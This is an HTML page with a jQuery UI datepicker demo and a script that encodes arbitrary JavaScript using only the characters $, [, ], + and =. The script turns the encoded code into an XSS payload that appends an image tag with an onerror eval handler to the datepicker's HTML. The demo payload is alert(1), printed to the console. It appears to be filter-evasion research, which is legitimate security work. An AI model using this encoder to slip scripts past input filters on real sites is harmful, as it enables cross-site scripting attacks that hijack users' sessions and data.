
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>jQuery UI Datepicker - Default functionality</title>
	<link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
	<link rel="stylesheet" href="https://jqueryui.com/resources/demos/style.css">
	<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
	<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
	<script>
	$( function() {
		$( "#datepicker" ).datepicker();
	} );
	</script>
</head>
<body>

<p>Date: <input type="text" id="datepicker"></p>


<script>

  // based on https://syllab.fr/projets/experiments/xcharsjs/5chars.id.html

  /**
    $
    [
    ]
    +
    =
  **/





  function mapInt(int){

    if (int < 10) {
      return MAP[int];
    }

    let digits = int.toString().split('');
    return '+[' + digits.map(d => `[${MAP[d]}]`).join('+') + ']';
  }

  function mapStr(str){
    let chars = str.split('');
    for(let char of chars){
      if (!(char in MAP)) {
        const index = $$$$$$$.indexOf(char);
        if (index >= 0) {
          MAP[char] = `$$$$$$$[${mapInt(index)}]`
        } else {
          throw new Error(`char ${char} is not available in ${str}`);
        }

      }
    }
    return chars.map(c => MAP[c]).join('+');
  }

  const MAP = {
    0: `+[]`,
    1: `++[[]][+[]]`,
    2: `++[++[[]][+[]]][+[]]`,
    3: `++[++[++[[]][+[]]][+[]]][+[]]`,
    4: `++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]`,
    5: `++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    6: `++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    7: `++[++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    8: `++[++[++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    9: `++[++[++[++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,

    // [][0] === undefined
    u: `[[]+[][[]]][+[]][+[]]`,
    n: `[[]+[][+[]]][+[]][++[[]][+[]]]`,
    d: `[[]+[][+[]]][+[]][++[++[[]][+[]]][+[]]]`,
    e: `[[]+[][+[]]][+[]][++[++[++[[]][+[]]][+[]]][+[]]]`,
    f: `[[]+[][+[]]][+[]][++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]]`,
    i: `[[]+[][+[]]][+[]][++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]]`,

    // +undefined+[] === "NaN"
    N: `[+[][+[]]+[]][+[]][+[]]`,
    a: `[+[]+[][+[]]+[]][+[]][++[[]][+[]]]`
  }

  // +("1e1000") === Infinity
  MAP[Infinity] = `+[${MAP[1]}+${MAP.e}${mapInt(1000)}]+[]`;
  $$$$$$ = eval(MAP[Infinity]);

  Object.assign(MAP, {
    I: `$$$$$$[${MAP[0]}]`,
    t: `$$$$$$[${MAP[6]}]`,
    y: `$$$$$$[${MAP[7]}]`,
    "+": `[+[${MAP[1]}+${MAP.e}${mapInt(100)}]+[]][+[]][${MAP[2]}]`, // +("1e100")+"" === "1e+100"
    ".": `[+[${mapInt(11)}+${MAP.e}${mapInt(20)}]+[]][+[]][${MAP[1]}]` // +("11e20")+"" === "1.1e+21"
  });

  // []["find"] === function find() { [native code] }
  MAP[Array.prototype.find] = `[][${mapStr("find")}]`;
  $$$ = eval(MAP[Array.prototype.find]);

  Object.assign(MAP, {
    "c": `[$$$+[]][+[]][${mapInt(3)}]`,
    "o": `[$$$+[]][+[]][${mapInt(6)}]`,
    "v": `[$$$+[]][+[]][${mapInt(23)}]`,
    " ": `[$$$+[]][+[]][${mapInt(8)}]`,
    "(": `[$$$+[]][+[]][${mapInt(13)}]`,
    ")": `[$$$+[]][+[]][${mapInt(14)}]`,
    "{": `[$$$+[]][+[]][${mapInt(16)}]`,
    "}": `[$$$+[]][+[]][${mapInt(32)}]`,
    "[": `[$$$+[]][+[]][${mapInt(18)}]`,
    "]": `[$$$+[]][+[]][${mapInt(30)}]`
  });

  MAP["$.find"] = `[$[${mapStr("find")}]+[]][+[]]`;
  $$$$$$$ = eval(MAP["$.find"]);

  MAP["constructor"] = mapStr("constructor");
  $$$$ = eval(MAP["constructor"]);

  MAP["String"] = `[[]+[]][+[]][$$$$][${mapStr("name")}]`;
  MAP["outerHTML"] = mapStr("outerHTML");
  $$$$$ = eval(MAP["outerHTML"]);

  // $.datepicker.dpDiv
  MAP["$.datepicker.dpDiv"] = `[$[${mapStr("datepicker")}][${mapStr("dpDiv")}]][+[]][+[]]`;
  $$$$$$$$ = eval(MAP["$.datepicker.dpDiv"]);

  Object.assign(MAP, {
    '<': `$$$$$$$$[$$$$$][${mapInt(0)}]`,
    '>': `$$$$$$$$[$$$$$][${mapInt(110)}]`,
    '=': `$$$$$$$$[$$$$$][${mapInt(7)}]`,
    '"': `$$$$$$$$[$$$$$][${mapInt(8)}]`
  });

  $$ = ",";


  function encode(input){
    let charcodes = [];
    for(var c=0; c<input.length; c++){
      charcodes.push(`[${mapInt(input.charCodeAt(c))}][+[]]`);
    }

    // $.datepicker.dpDiv.outerHTML += " <img src='' onerror='eval(`code`)'>"
    return `
     [$$$$$$$$ = ${MAP["$.datepicker.dpDiv"]}] +
     [$$$$$$$ = ${MAP["$.find"]}] +
     [$$$$$$ = ${MAP[Infinity]}]
    +[$$$$$ = ${MAP["outerHTML"]}]
    +[$$$$ = ${MAP["constructor"]}]
    +[$$$ = ${MAP[Array.prototype.find]}]
    +[$$=[+[]]]+[$$[++[[]][+[]]]=+[]]+[$$=[$$+[]][+[]][++[[]][+[]]]]
    +[$$$$$$$$[$$$$$]+=${mapStr(`<img src="u" onerror="eval(`)}+${MAP["String"]}+${mapStr(".fromCharCode(")}
    +[ []+ ${ charcodes.join(`+$$+`) } ][+[]]+ ${ mapStr(`))">`)}]`
    .replace(/\s/g, "");
  }

  encodedAlert = encode("alert(1)");
  console.log(encodedAlert);
  // setTimeout(encodedAlert, 1000);

  </script>

</body>
</html>
